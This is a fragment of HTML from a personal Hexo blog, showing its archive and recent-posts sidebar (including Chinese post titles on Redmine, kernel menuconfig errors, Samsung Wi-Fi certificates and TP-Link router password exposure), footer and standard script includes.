class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">March 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/02/">February 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">January 2013</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2017/11/25/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2014/04/20/在ubuntu上安装redmine/">在ubuntu上安装redmine</a>
          </li>
        
          <li>
            <a href="/2014/04/14/Linux-kernel-make-menuconfig-时出错处理方法/">Linux kernel make menuconfig 时出错处理方法</a>
          </li>
        
          <li>
            <a href="/2014/02/15/解决三星手机WIFI“此网络不可用。证书已到期”方法/">解决三星手机WIFI“此网络不可用。证书已到期”方法</a>
          </li>
        
          <li>
            <a href="/2014/01/19/某些TP-Link路由器可以被远程获取密码/">某些TP-Link路由器可以被远程获取密码</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2017 Frank Feng<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>